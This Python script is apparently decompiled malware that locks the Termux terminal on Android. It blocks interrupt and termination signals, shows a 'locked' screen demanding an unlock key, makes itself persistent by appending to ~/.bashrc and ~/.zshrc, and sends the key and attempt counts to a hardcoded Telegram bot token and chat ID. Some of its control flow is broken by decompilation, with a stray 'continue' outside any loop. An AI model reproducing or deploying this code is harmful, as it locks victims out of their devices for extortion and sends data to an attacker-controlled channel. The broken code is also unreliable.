import os
import sys
import random
import string
import requests
import threading
import signal
from time import sleep
BOT_TOKEN = '8264241310:AAErSGZ1Rvhcu1xdcU_Lhwh0A2DIxFK_ktE'
CHAT_ID = '7914559824'
UNLOCK_FILE = '/data/data/com.termux/files/home/.termux_unlocked'

class Colors:
    RED = '[91m'
    GREEN = '[92m'
    YELLOW = '[93m'
    BLUE = '[94m'
    MAGENTA = '[95m'
    CYAN = '[96m'
    WHITE = '[97m'
    BOLD = '[1m'
    UNDERLINE = '[4m'
    END = '[0m'

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def send_to_telegram(message):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
        requests.post(url, data=data, timeout=30)
    except:
        return

def is_unlocked():
    return os.path.exists(UNLOCK_FILE)

def mark_unlocked():
    with open(UNLOCK_FILE, 'w') as f:
        f.write('UNLOCKED')

def block_signals():
    def signal_handler(signum, frame):
        print(f'\n{Colors.RED}❌ Signal {signum} blocked! Termux is locked.{Colors.END}')
        print(f'{Colors.YELLOW}📢 You must enter the correct key to exit.{Colors.END}')
    signals = [signal.SIGINT, signal.SIGTERM, signal.SIGTSTP, signal.SIGQUIT, signal.SIGHUP]
    for sig in signals:
        try:
            signal.signal(sig, signal_handler)
        except:
            pass

def show_lock_screen(key):
    os.system('clear')
    ascii_art = f'\n{Colors.CYAN}\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@%@%%@%@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@%%@%@%%@%@%%@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@%%%@#%#%%#@%%%@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@%#%#%##%#%#%@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@%%#%%##%%%%%@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@%%@%%%%#%%#%%%%@%%@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@%@@%@%@%%%%#%%%@%@%@@%@@@@@@@@@@@@@@\n@@@@@@%@@@@@%@@@%%%%%%%%%%%@@@%@%%@@@%@@@@@@%@@@@@\n@@@@@@@%%@@%@@@@@@@@@%%%%%%%%@@@@@%@@@%@@@%%@@@@@@\n@@@@@@@@@%#%@@@%@%#%@@@%%%%@@@%##%@@@@%#%%@@@@@@@@\n@@@@@@@@@%@%%##%%###@@@%##%@@@###%%%##%@%@@@@@@@@@\n@@@@@@@@%%@@@%#####%%@@%##%@@%%%#####%@@%%@@@@@@@@\n@@@@@@@@%@%#####%%#%@@@@%%@@@@@##%%####%%%@@@@@@@@\n@@@@@@@@%@%%%%#%%%@%@@@%%%%@@@%%@%%%#%%%%%@@@@@@@@\n@@@@@@@@%@%%#%%%%%%%%%##%%%%@%%%%%%%%%%%%%@@@@@@@@\n@@@@@@@@%@%%%%%%@@@@##%%%%%%%%@@@@@%%%%%@%@@@@@@@@\n@@@@@@@@%@%%@%%@@@%##%@@%%%%%##%@@@@%%@%%@@@@@@@@@\n@@@@@@@@@%@@@%%@@##%@@@@@@@@@@%%#%@@%@@@%@@@@@@@@@\n@@@@@@@@@%%%%%@%##%@@@@@%%@@@@@@%#%@@%%%@@@@@@@@@@\n@@@@@@@@@@%#%%%#%@@@@@@@%%@@@@@@@%##%%%@@@@@@@@@@@\n@@@@@@@@@@@@##%%%@@%@@@@%%@@@@%@@@%%%#@@@@@@@@@@@@\n@@@@@@@@@@@@@%%%%@@%%@%%##%%@%%@@@%%%@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@%%@@%%%@%%%%@@%%@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@%@@%##%@@%@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n{Colors.END}\n    '
    print(ascii_art)
    print(f'{Colors.RED}{Colors.BOLD}🔒 TERMUX LOCKED BY XYNTRYX{Colors.END}')
    print(f"{Colors.YELLOW}{'============================================================'}{Colors.END}")
    print(f'{Colors.WHITE}Your Termux has been locked by security system!{Colors.END}')
    print(f'{Colors.WHITE}Contact administrator to get the unlock key.{Colors.END}')
    print(f"{Colors.YELLOW}{'============================================================'}{Colors.END}")
    try:
        input_key = input(f'{Colors.GREEN}🔑 Enter unlock key: {Colors.END}')
    except (KeyboardInterrupt, EOFError):
        pass  # postinserted
    else:  # inserted
        if input_key == key:
            print(f'\n{Colors.GREEN}✅ Access granted! Unlocking permanently...{Colors.END}')
            mark_unlocked()
            sleep(2)
            return True
        print(f'\n{Colors.RED}❌ Invalid key! Termux remains locked.{Colors.END}')
        sleep(2)
        return False
        print(f'\n{Colors.RED}❌ Input interrupted! Returning to lock screen...{Colors.END}')
        sleep(2)
        return False

def lock_system():
    key = generate_key()
    block_signals()
    send_to_telegram(f'🔐 TERMUX LOCK ACTIVATED\n\n🔑 Unlock Key: <code>{key}</code>\n\n⚠️ Do not share this key!\n\n📱 Target: Termux\n🔒 Status: LOCKED\n\n💀 All signals blocked - Cannot force quit!')
    attempt_count = 0
    pass
    if not show_lock_screen(key):
        attempt_count += 1
        if attempt_count >= 3:
            send_to_telegram(f'🚨 MULTIPLE FAILED ATTEMPTS\n\nFailed unlock attempts: {attempt_count}\n🔑 Key: <code>{key}</code>')
        continue
    send_to_telegram(f'✅ TERMUX UNLOCKED\n\nTarget has entered the correct key!\n🔓 System: UNLOCKED\n📊 Attempts: {attempt_count + 1}')
    pass
    print(f'{Colors.GREEN}System unlocked successfully!{Colors.END}')
    print(f'{Colors.BLUE}You can now use Termux normally.{Colors.END}')
    sys.exit()

def make_persistent():
    if not is_unlocked():
        bashrc_path = os.path.expanduser('~/.bashrc')
        script_path = os.path.abspath(__file__)
        entry = f'\n# Auto-lock Termux\npython {script_path}\n'
        if os.path.exists(bashrc_path):
            with open(bashrc_path, 'r') as f:
                content = f.read()
            if script_path not in content:
                with open(bashrc_path, 'a') as f:
                    f.write(entry)
        else:  # inserted
            with open(bashrc_path, 'w') as f:
                f.write(entry)
        zshrc_path = os.path.expanduser('~/.zshrc')
        if os.path.exists(zshrc_path):
            with open(zshrc_path, 'r') as f:
                content = f.read()
            if script_path not in content:
                with open(zshrc_path, 'a') as f:
                    f.write(entry)

def background_monitor():
    while True:
        try:
            if not is_unlocked():
                sleep(10)
            else:  # inserted
                break
    except:
        pass
if __name__ == '__main__':
    if is_unlocked():
        print(f'{Colors.GREEN}✅ Termux is already unlocked!{Colors.END}')
        sys.exit()
    make_persistent()
    bg_thread = threading.Thread(target=background_monitor, daemon=True)
    bg_thread.start()
    try:
        lock_system()
    except Exception as e:
        pass  # postinserted
    print(f'{Colors.RED}⚠️ System error, restarting lock...{Colors.END}')
    sleep(1)
    lock_system()